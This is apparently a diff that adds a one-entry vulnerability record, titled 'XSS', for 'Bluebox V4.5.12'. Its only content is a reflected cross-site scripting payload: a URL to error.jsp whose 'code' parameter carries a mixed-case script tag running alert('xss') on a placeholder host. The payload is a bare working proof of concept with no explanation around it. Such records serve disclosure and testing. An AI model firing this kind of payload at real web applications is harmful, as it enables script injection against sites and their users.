@@ -1,0 +1,6 @@
+
+XSS
+
+Bluebox V4.5.12
+
+www.site.com.br/app/error.jsp?code=1%27"<ScRiPt%20>alert(%27xss%27)</ScRiPt>
